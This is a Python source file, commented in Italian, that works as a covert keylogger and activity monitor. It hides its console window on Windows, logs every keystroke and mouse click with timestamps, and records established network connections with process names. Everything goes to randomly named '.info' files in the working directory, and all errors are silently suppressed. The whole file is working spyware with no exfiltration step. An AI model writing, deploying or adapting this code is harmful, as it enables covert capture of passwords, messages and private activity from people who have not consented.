import os
import random
import string
import psutil
import threading
import time
from pynput import keyboard, mouse
from datetime import datetime
import sys

# --------- Nascondi console su Windows ---------
if os.name == 'nt':
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# --------- Genera i NOMI random solo la prima volta ---------
def random_filename():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + ".info"
def requests_filename():
    nums = ''.join(random.choices(string.digits, k=7))
    return f"requests_{nums}.info"

# Crea i due file random una sola volta all'avvio
log_file = os.path.join(os.getcwd(), random_filename())
requests_file = os.path.join(os.getcwd(), requests_filename())

# Inizializza i due file (scrive header)
with open(log_file, "w", encoding="utf-8") as f:
    f.write(f"Session started: {datetime.now()}\n{'-'*40}\n")
with open(requests_file, "w", encoding="utf-8") as f:
    f.write(f"Requests log started: {datetime.now()}\n{'-'*40}\n")

# --------- LOG ACTIVITY ---------
def log_activity(msg):
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(f"{msg}\n")

# --------- LOG REQUESTS ---------
def log_request(msg):
    with open(requests_file, "a", encoding="utf-8") as f:
        f.write(f"{msg}\n")

# --------- Tastiera migliorata ---------
def keyboard_listener():
    from pynput.keyboard import Key, Listener

    specials = {
        Key.space: "[SPACE]",
        Key.enter: "[ENTER]",
        Key.tab: "[TAB]",
        Key.backspace: "[BACKSPACE]",
        Key.shift: "[SHIFT]",
        Key.shift_r: "[SHIFT_R]",
        Key.ctrl: "[CTRL]",
        Key.ctrl_r: "[CTRL_R]",
        Key.alt: "[ALT]",
        Key.alt_r: "[ALT_R]",
        Key.caps_lock: "[CAPSLOCK]",
        Key.esc: "[ESC]",
        Key.up: "[UP]",
        Key.down: "[DOWN]",
        Key.left: "[LEFT]",
        Key.right: "[RIGHT]"
    }

    def on_press(key):
        try:
            k = key.char
            msg = f"[{datetime.now().strftime('%H:%M:%S')}] Key pressed: '{k}'"
        except AttributeError:
            msg = f"[{datetime.now().strftime('%H:%M:%S')}] Key pressed: {specials.get(key, str(key))}"
        log_activity(msg)

    with Listener(on_press=on_press) as listener:
        listener.join()

# --------- Mouse ---------
def mouse_listener():
    def on_click(x, y, button, pressed):
        if pressed:
            msg = f"[{datetime.now().strftime('%H:%M:%S')}] Mouse click: {button} at ({x},{y})"
            log_activity(msg)
    with mouse.Listener(on_click=on_click) as listener:
        listener.join()

# --------- Network Connections ---------
def net_connections_monitor():
    old_conns = set()
    while True:
        try:
            current_conns = set()
            for conn in psutil.net_connections(kind='inet'):
                if conn.status == 'ESTABLISHED' and conn.laddr and conn.raddr:
                    pid = conn.pid or 0
                    process = ""
                    try:
                        process = psutil.Process(pid).name() if pid else ""
                    except:
                        pass
                    key = (pid, conn.laddr, conn.raddr)
                    current_conns.add(key)
                    if key not in old_conns:
                        msg = (
                            f"[{datetime.now().strftime('%H:%M:%S')}] "
                            f"PID:{pid} {process} "
                            f"from {conn.laddr.ip}:{conn.laddr.port} "
                            f"to {conn.raddr.ip}:{conn.raddr.port}"
                        )
                        log_request(msg)
            old_conns = current_conns
            time.sleep(1)
        except Exception as e:
            pass  # Silenzia qualsiasi errore

# --------- THREADING AVVIO ---------
if __name__ == "__main__":
    threading.Thread(target=keyboard_listener, daemon=True).start()
    threading.Thread(target=mouse_listener, daemon=True).start()
    threading.Thread(target=net_connections_monitor, daemon=True).start()
    while True:
        time.sleep(1)  # Keep main thread alive
